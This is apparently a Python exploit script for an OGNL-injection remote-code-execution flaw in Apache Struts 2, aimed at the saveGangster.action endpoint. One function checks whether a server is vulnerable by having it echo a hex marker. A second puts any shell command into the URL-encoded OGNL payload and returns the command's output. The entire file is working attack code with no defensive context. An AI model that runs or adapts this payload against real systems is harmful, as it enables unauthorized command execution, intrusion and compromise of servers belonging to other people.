# -*- coding: utf-8 -*-
#author: cwbird
import re
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp_check(url):
    payload = "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27echo 7969676569776f6c696769616f%27%29.getInputStream%28%29%29%29.%28%23q%29%7D&age=111&__checkbox_bustedBefore=true&description=11"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    try:
        r = requests.post(url+'/integration/saveGangster.action', data =payload,headers=headers,timeout=5,verify= False)
        if r"7969676569776f6c696769616f" in r.text:
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    payload = "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27"+cmd+"%27%29.getInputStream%28%29%29%29.%28%23q%29%7D&age=111&__checkbox_bustedBefore=true&description=11"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    
    try:
        r = requests.post(url+'/integration/saveGangster.action', data =payload,headers=headers,timeout=5,verify= False)
        pattern = "(?<=Gangster )[\s\S]*(?=\n added)"
        rep = re.search(pattern,r.text).group()

        return rep
    except:
        return 3
if __name__ == '__main__':
    pass
